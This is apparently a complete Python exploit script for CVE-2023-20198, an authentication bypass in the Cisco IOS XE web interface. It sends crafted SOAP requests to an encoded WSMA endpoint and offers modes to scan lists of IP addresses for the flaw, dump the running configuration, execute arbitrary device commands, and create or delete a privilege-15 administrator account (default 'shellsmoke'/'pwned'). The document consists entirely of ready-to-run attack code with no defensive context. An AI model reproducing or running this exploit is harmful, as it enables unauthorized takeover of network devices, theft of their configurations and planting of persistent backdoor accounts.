#!/usr/bin/env python3
import requests
import argparse
import ipaddress
import xml.etree.ElementTree as ET
import logging
import logging.config
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.config.dictConfig({'version': 1, 'disable_existing_loggers': True})
print = logging.info
printv = logging.debug
printe = logging.error

rExecCmd = "<TMPEXECCMD>"
rAddUserMod = "<TMPUSERMOD>"
addUserDefName = "shellsmoke"
addUserDefPass = "pwned"
execCmdGetConfig = "sh run"
execCmdCheck = "uname -a"
exURI = '%2577eb%2575i_%2577sma_Http'

exTmpExecCmd = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-exec">
<execCLI xsd="false">
<cmd><TMPEXECCMD></cmd>
<dialogue>
<expect></expect>
<reply></reply>
</dialogue>
</execCLI>
</request>
</SOAP:Body>
</SOAP:Envelope>"""

exTmpAddUser = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP:Header>
<wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
<wsse:UsernameToken SOAP:mustUnderstand="false">
<wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password>
</wsse:UsernameToken>
</wsse:Security>
</SOAP:Header>
<SOAP:Body>
<request correlator="exec1" xmlns="urn:cisco:wsma-config">
<configApply details="all">
<config-data>
<cli-config-data-block>
<TMPUSERMOD>
</cli-config-data-block>
</config-data>
</configApply>
</request>
</SOAP:Body>
</SOAP:Envelope>"""

class vCisco:
    def __init__(self, ip, url=None, vuln=None, ver=None):
        self.ip = ip
        self.vuln = vuln
        self.ver = ver
        self.url = url

def parseArgs():
    ap = argparse.ArgumentParser(description='CVE-2023-20198 Exploit PoC', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50))
    groupTarget = ap.add_mutually_exclusive_group(required=True)
    groupTarget.add_argument('-t', dest='targetIP', metavar='targetIP', action='store', help='Target IP Address')
    groupTarget.add_argument('-l', dest='targetFile', metavar='targetFile', action='store', help='File containing IP Addresses (-c only)')
    ap.add_argument('-https', dest='tHttps', action='store_true', help='Use https')
    groupMode = ap.add_mutually_exclusive_group(required=True)
    groupMode.add_argument('-c', dest='checkVuln', action='store_true', help='[X] Check for vulnerability ')
    groupMode.add_argument('-g', dest='getConfig', action='store_true', help='[X] Get Cisco IOS running config')
    groupMode.add_argument('-e', dest='execCmd', metavar='command', action='store', help='[X] Execute Cisco IOS command')
    groupMode.add_argument('-a', dest='addUser', action='store_true', help='[X] Add new priv 15 user')
    groupMode.add_argument('-d', dest='delUser', action='store_true', help='[X] Remove priv 15 user')
    ap.add_argument('-u', dest='addUserName', metavar='newUserName', action='store', help=f'[Optional] user name for -a or -d. Default: {addUserDefName}')
    ap.add_argument('-p', dest='addUserPass', metavar='newUserPass', action='store', help=f'[Optional] new user pass for -a. Default: {addUserDefPass}')
    ap.add_argument('-o', dest='outFile', metavar='outputFile', action='store', help='Write output to file')
    ap.add_argument('-v', dest='verbose', action='store_true', default=False, help='Increase verbosity')

    args = ap.parse_args()
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, format="%(message)s")

    if args.targetFile and not args.checkVuln:
        printe("-l can only be used with -c")
        exit(1)

    uScheme = 'https' if args.tHttps else 'http'
    targetIP, targetUrl, targetFile = None, None, None

    if args.targetIP:
        targetIP = args.targetIP
        try:
            ipaddress.ip_address(targetIP)
        except ValueError:
            printe(f"Input target {targetIP} is not a valid IP address!")
            exit(1)
        targetUrl = f'{uScheme}://{targetIP}/{exURI}'
    elif args.targetFile:
        targetFile = args.targetFile

    runSet, runSetArgs = None, []
    if args.addUser or args.delUser:
        runSet = "addUser"
        runSetMode = "ADDUSER" if args.addUser else "DELUSER"
        addUserName = args.addUserName if args.addUserName else addUserDefName
        addUserPass = args.addUserPass if args.addUser and args.addUserPass else None
        runSetArgs = [runSetMode, addUserName, addUserPass]
    elif args.execCmd or args.getConfig:
        runSet = "execCmd"
        execCmd = args.execCmd if args.execCmd else execCmdGetConfig
        runSetArgs = [execCmd]
    elif args.checkVuln:
        runSet = "checkVuln"
        runSetArgs = [execCmdCheck]

    return targetIP, targetFile, targetUrl, runSet, runSetArgs, args.outFile, uScheme

def modExploit(runSet, runSetArgs):
    if runSet in ["execCmd", "checkVuln"]:
        modEx = exTmpExecCmd.replace(rExecCmd, runSetArgs[0])
    elif runSet == "addUser":
        mUserMod = f"username {runSetArgs[1]} privilege 15 secret {runSetArgs[2]}" if runSetArgs[0] == "ADDUSER" else f"no username {runSetArgs[1]} privilege 15"
        modEx = exTmpAddUser.replace(rAddUserMod, mUserMod)
    return modEx

def formatOut(stage, **kwargs):
    if stage == 1:
        print(f"Selected Target:\t{kwargs['targetIP']}")
        if kwargs['runSet'] == "execCmd":
            print(f"Running in Exec Mode\nExecuting Command:\t{kwargs['runSetArgs'][0]}\n")
        elif kwargs['runSet'] == "addUser":
            mode, name, _ = kwargs['runSetArgs']
            action = "Adding" if mode == "ADDUSER" else "Deleting"
            print(f"{action} New Privilege 15 User\nUser Name:\t{name}\n")
    elif stage == 2:
        printv(f"Full SOAP request body:\n{kwargs['modEx']}\n")
    elif stage == 3:
        print(f"Sending exploit to target URL:\t{kwargs['targetUrl']}")
    elif stage == 4:
        status_ok = kwargs['exStat'] == 200 and kwargs['exContent'] == 'text/xml'
        printv('Responses look okay, exploit should have worked' if status_ok else "Responses don't look right, check verbose output")
        printv(f"Response Status Code:\t{kwargs['exStat']}\nResponse Content-Type:\t{kwargs['exContent']}\nHTTP Response Body:\n{kwargs['exXml']}\n")
    elif stage == 5:
        print(f"Writing command output to {kwargs['outFile']}")
    elif stage == 6:
        print("Done.")
    elif stage == 100:
        print("Testing for vulnerability")
        for vt in kwargs['vtargetsOut']:
            print(vt)
    elif stage == 101:
        print(f"Vulnerability check results written to {kwargs['outFile']}")

def sendExploit(targetUrl, modEx):
    headers = {
        'Host': targetUrl,
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)',
        'Connection': 'Keep-Alive',
        'Cache-Control': 'no-cache',
        'SOAPAction': 'runCmd',
        'Content-Type': 'text/xml; charset=utf-8',
        'Content-Length': str(len(modEx))
    }
    try:
        r = requests.post(targetUrl, headers=headers, data=modEx, verify=False, timeout=10)
        exStat = r.status_code
        exContent = r.headers.get('content-type')
        exXml = r.text
        return exStat, exContent, exXml
    except requests.RequestException as e:
        printe(f"Error sending request: {e}")
        exit(1)

def checkVuln(targetFile, runSet, runSetArgs, uScheme):
    vTargets = []
    with open(targetFile) as tF:
        for line in tF:
            if line.strip():
                try:
                    ipaddress.ip_address(line.strip())
                    targetUrl = f'{uScheme}://{line.strip()}/{exURI}'
                    modEx = modExploit(runSet, runSetArgs)
                    exStat, exContent, _ = sendExploit(targetUrl, modEx)
                    if exStat == 200 and exContent == 'text/xml':
                        vTargets.append(vCisco(line.strip(), targetUrl, "VULN"))
                except ValueError:
                    printe(f"Invalid IP address in file: {line.strip()}")
    return vTargets

def getCmdOut(runSetArgs, exXml):
    root = ET.fromstring(exXml)
    execout = root.find('.//{urn:cisco:wsma-exec}execCLI').find('response').text
    if execout is None:
        printe("Command output not found in XML response.")
    return execout

def main():
    targetIP, targetFile, targetUrl, runSet, runSetArgs, outFile, uScheme = parseArgs()
    formatOut(1, targetIP=targetIP, runSet=runSet, runSetArgs=runSetArgs)

    if targetFile and runSet == "checkVuln":
        vtargetsOut = checkVuln(targetFile, runSet, runSetArgs, uScheme)
        formatOut(100, vtargetsOut=vtargetsOut)
        if outFile:
            with open(outFile, 'w') as f:
                for vt in vtargetsOut:
                    f.write(f"Target:\t{vt.ip}\t{vt.vuln}\t{vt.url}\n")
            formatOut(101, outFile=outFile)
        return

    modEx = modExploit(runSet, runSetArgs)
    formatOut(2, modEx=modEx)

    formatOut(3, targetUrl=targetUrl)
    exStat, exContent, exXml = sendExploit(targetUrl, modEx)
    formatOut(4, exStat=exStat, exContent=exContent, exXml=exXml)

    if runSet == "execCmd":
        execout = getCmdOut(runSetArgs, exXml)
        if execout:
            if outFile:
                with open(outFile, 'w') as f:
                    f.write(execout)
                formatOut(5, outFile=outFile)
            else:
                print(execout)
    formatOut(6)

if __name__ == "__main__":
    main()
